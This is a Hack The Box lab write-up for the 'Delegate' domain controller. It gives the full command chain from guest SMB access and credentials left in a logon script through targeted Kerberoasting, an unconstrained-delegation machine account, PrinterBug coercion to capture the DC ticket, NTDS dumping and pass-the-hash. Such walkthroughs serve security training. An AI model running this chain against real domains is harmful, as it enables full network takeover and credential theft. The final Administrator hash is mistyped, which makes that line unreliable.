---
icon: message-minus
---

# HTB-DELEGATE (VL)

<figure><img src="../../../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance & Initial Enumeration

#### Nmap Scan Results

Comprehensive port scan reveals standard Windows Domain Controller services:

```bash
nmap -sC -sV -oA delegate 10.129.123.78
```

**Open Ports & Services**:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-16 13:13:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[additional RPC ports...]
```

**Key Information from RDP Certificate**:

```
Target_Name: DELEGATE
NetBIOS_Domain_Name: DELEGATE
NetBIOS_Computer_Name: DC1
DNS_Domain_Name: delegate.vl
DNS_Computer_Name: DC1.delegate.vl
DNS_Tree_Name: delegate.vl
Product_Version: 10.0.20348
System_Time: 2025-09-16T13:14:16+00:00
```

#### Hosts File Configuration

Add domain entries to `/etc/hosts`:

```bash
echo "10.129.123.78 DC1.delegate.vl delegate.vl" >> /etc/hosts
```

***

### SMB Enumeration & Initial Access

#### SMB Share Discovery

**Enumerate SMB Shares with Guest Access**:

```bash
smbmap -H 10.129.123.78 -d 'delegate.vl' -u 'GUEST' -p ''
```

**Result**: Access granted to several shares including NETLOGON.

#### SMB Client Connection

**Connect as Guest User**:

```bash
smbclient.py 'delegate.vl'/'GUEST':''@10.129.123.78
```

**Success**: Successfully connected as GUEST user.

#### NETLOGON Share Access

**Access NETLOGON Share**:

```bash
use NETLOGON
ls
```

**Discovered Files**:

* `users.bat` - Batch script containing credentials

#### Credential Discovery

**Read users.bat Content**:

```bash
cat users.bat
```

🔑 **Critical Discovery**:

* **Username**: `A.Briggs`
* **Password**: `P4ssw0rd1#123`

#### Credential Validation

**Verify Discovered Credentials**:

```bash
nxc smb 10.129.123.78 -u 'A.Briggs' -p 'P4ssw0rd1#123' --users
```

**Success**: Credentials valid, additional users enumerated successfully.

***

### Bloodhound Enumeration & Analysis

#### Domain Data Collection

**Collect Full AD Enumeration**:

```bash
bloodhound-python -u 'A.Briggs' -p 'P4ssw0rd1#123' -d 'delegate.vl' -c All -ns 10.129.123.78 --dns-tcp --zip
```

#### BloodHound Analysis Results

**Key Findings**:

1. `A.BRIGGS` has `GenericWrite` permissions on `N.THOMPSON`
2. `N.THOMPSON` is a member of the **Remote Management Users Group**
3. `N.THOMPSON` is a member of the **Delegation Admins Group**

#### Attack Path Identification

```
A.Briggs (GenericWrite) → N.Thompson → Remote Management + Delegation Admins
```

This path suggests:

* We can modify N.Thompson's properties
* N.Thompson has remote access capabilities
* N.Thompson has delegation-related privileges

***

### Kerberoasting Attack

#### Targeted Kerberoasting

**Execute Kerberoasting Against N.Thompson**:

```bash
targetedKerberoast.py -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123' --dc-ip '10.129.123.78'
```

**Success**: Retrieved Kerberos ticket hash for N.Thompson.

**Hash Format**:

```
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$[hash_data]
```

#### Hash Cracking

**Crack Kerberos Hash**:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt n.thompson.hash
```

🔑 **Password Cracked**: `KALEB_2341`

***

### User Access & Flag

#### Remote Shell Access

**Evil-WinRM Connection**:

```bash
evil-winrm -i 10.129.123.78 -u 'delegate.vl\N.Thompson' -p 'KALEB_2341'
```

**Success**: Obtained shell as N.Thompson with Remote Management privileges.

#### User Flag

**Retrieve User Flag**:

```bash
type C:\Users\N.Thompson\Desktop\user.txt
```

**User Flag Obtained**: Successfully retrieved user.txt from N.Thompson's desktop.

***

### Privilege Escalation Analysis

#### User Privilege Enumeration

**Check Current User Privileges**:

```bash
whoami /priv
```

🔑 **Critical Discovery**: N.Thompson has **SeEnableDelegationPrivilege** enabled.

**Privilege Explanation**:

* `SeEnableDelegationPrivilege` allows configuration of unconstrained and constrained delegation
* This privilege can be used to set TRUSTED\_FOR\_DELEGATION flag on machine accounts
* Combined with DNS manipulation, this enables Domain Controller impersonation attacks

#### Machine Account Quota Check

**Check Machine Account Quota**:

```bash
netexec ldap dc1.delegate.vl -u A.Briggs -p P4ssw0rd1#123 -M maq
```

**Result**: MachineAccountQuota = 10 (default value) **Confirmed**: Any domain user can add up to 10 machine accounts to the domain.

***

### Advanced Privilege Escalation: Unconstrained Delegation Attack

#### Step 1: Kerberos Configuration

**Generate Kerberos Configuration**:

```bash
nxc smb 10.129.123.78 -u 'N.Thompson' -p 'KALEB_2341' --generate-krb5-file /etc/krb5.conf
```

#### Step 2: Create Malicious Machine Account

**Add New Machine Account**:

```bash
addcomputer.py -computer-name zero -computer-pass 'pa$$w0rd' -dc-ip 10.129.123.78 delegate.vl/N.Thompson:'KALEB_2341'
```

**Machine Details**:

* **Name**: `zero$`
* **Password**: `pa$$w0rd`

**Success**: Machine account `zero$` added to domain.

#### Step 3: DNS Record Manipulation

**Add DNS Record for Malicious Machine**:

```bash
dnstool.py -u 'delegate.vl\zero$' -p 'pa$$w0rd' --action add --record zero.delegate.vl --data 10.10.14.xxx --type A -dns-ip 10.129.123.78 dc1.delegate.vl
```

**Configuration**:

* **Hostname**: `zero.delegate.vl`
* **IP**: `10.10.14.xxx` (attacker's tun0 interface)

**Success**: DNS record created pointing to attacker machine.

#### Step 4: Machine Account Configuration

**Set DNS Hostname**:

```powershell
Set-ADComputer zero -DNSHostName "zero.delegate.vl"
```

**Add Service Principal Names (SPNs)**:

```powershell
Set-ADComputer zero -ServicePrincipalNames @{Add='HOST/zero.delegate.vl'}
Set-ADComputer zero -ServicePrincipalNames @{Add='HOST/zero'}
```

**Verify Configuration**:

```powershell
Get-ADComputer zero -Properties ServicePrincipalNames,DNSHostName
```

**Confirmed**: Machine account properly configured with hostname and SPNs.

#### Step 5: Enable Unconstrained Delegation

**Set TRUSTED\_FOR\_DELEGATION Flag**:

```bash
bloodyAD -d delegate.vl -u N.Thompson -p 'KALEB_2341' --host dc1.delegate.vl add uac 'zero$' -f TRUSTED_FOR_DELEGATION
```

🔑 **Critical Step**: The machine account is now configured for unconstrained delegation.

**Unconstrained Delegation Explained**:

* When a user authenticates to a service with unconstrained delegation
* The service receives a copy of the user's TGT (Ticket Granting Ticket)
* This TGT can be used to impersonate the user to any service
* If a Domain Controller authenticates, we get a DC TGT

#### Step 6: DNS Resolution Verification

**Verify DNS Record**:

```bash
dig @10.129.123.78 zero.delegate.vl +noall +answer
```

**Expected Result**:

```
zero.delegate.vl. 3600 IN A 10.10.14.xxx
```

**Confirmed**: DNS entry successfully resolves to attacker IP.

***

### Exploitation Phase

#### Step 7: Kerberos Relay Setup

**Generate NTLM Hash from Password**: Using online tool (https://www.browserling.com/tools/ntlm-hash):

* **Password**: `pa$$w0rd`
* **NTLM Hash**: `BDCADBE8FAC2267ADF85FDDA00258779`

**Start Kerberos Relay**:

```bash
krbrelayx.py -hashes :BDCADBE8FAC2267ADF85FDDA00258779
```

This tool will:

* Listen for incoming Kerberos authentication
* Extract TGTs from unconstrained delegation
* Save tickets to cache files

#### Step 8: Coercion Attack Discovery

**Enumerate Available Coercion Methods**:

```bash
netexec smb dc1.delegate.vl -u 'zero$' -p 'pa$$w0rd' -M coerce_plus
```

**Discovered Methods**:

* PrinterBug (available)
* PetitPotam
* ShadowCoerce
* DFSCoerce

🎯 **Selected Method**: PrinterBug (most reliable for this scenario)

#### Step 9: Execute Coercion Attack

**Trigger PrinterBug Coercion**:

```bash
netexec smb dc1.delegate.vl -u 'zero$' -p 'pa$$w0rd' -M coerce_plus -o LISTENER=zero.delegate.vl METHOD=PrinterBug
```

**Attack Flow**:

1. PrinterBug forces DC1 to authenticate to `zero.delegate.vl`
2. DNS resolves `zero.delegate.vl` to attacker IP (10.10.14.xxx)
3. DC1 authenticates to our malicious machine account
4. Due to unconstrained delegation, we receive DC1's TGT
5. TGT is automatically saved by krbrelayx

**Success**: Domain Controller TGT captured!

**Captured Ticket**:

```
DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

***

### Domain Compromise

#### Step 10: Use Captured TGT

**Set Kerberos Cache Environment**:

```bash
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

#### Step 11: Dump Domain Credentials

**Extract NTDS.dit Hashes**:

```bash
KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache netexec smb dc1.delegate.vl --use-kcache --ntds
```

🎯 **Success**: All domain hashes extracted using DC's TGT.

**Key Extracted Hashes**:

* **Administrator**: `c32198ceab4cc695e65045562aa3ee93`
* All user accounts
* All computer accounts
* Service accounts

***

### Root Access & Final Flag

#### Administrator Authentication

**Evil-WinRM as Administrator**:

```bash
evil-winrm -i dc1.delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee9 Success: Obtained Administrator shell using pass-the-hash.
```

#### Root Flag

**Retrieve Root Flag**:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag Obtained**: Full domain compromise achieved!

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
